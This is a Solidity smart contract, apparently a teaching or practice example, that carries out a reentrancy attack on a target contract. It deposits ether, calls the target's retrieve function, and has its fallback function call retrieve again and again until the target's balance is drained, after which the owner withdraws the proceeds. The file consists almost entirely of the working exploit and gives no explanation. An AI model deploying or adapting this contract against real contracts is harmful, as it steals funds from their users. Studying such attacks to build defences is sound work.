// SPDX-License-Identifier:MIT
pragma solidity >=0.7.0 <0.9.0;

interface alice {
    function retrieve() external;
    function deposit() external payable;
}

contract bob{

    uint256 public amount;
    address payable owner;
    alice victim;
    address public addr_alice;

    constructor () payable {
        owner= payable(msg.sender);
    }

    modifier onlyOwner() {
        require(owner==msg.sender,'no eres el owner');
        _;
    }

    function send(address payable _addr) external {
        victim = alice(_addr);
        addr_alice=_addr;
        amount=address(this).balance;
        victim.deposit{value: amount}();
    }

    function hack () external
    {
        victim.retrieve();
    }

    function getMoney() external onlyOwner
    {
        owner.transfer((address(this)).balance);
    }

    fallback() external payable{
        if (address(addr_alice).balance >= amount) 
        {
            victim.retrieve(); 
        }
    }

    function getAliceBalance() external view returns (uint256)
    {
        return (address(addr_alice).balance);
    }

}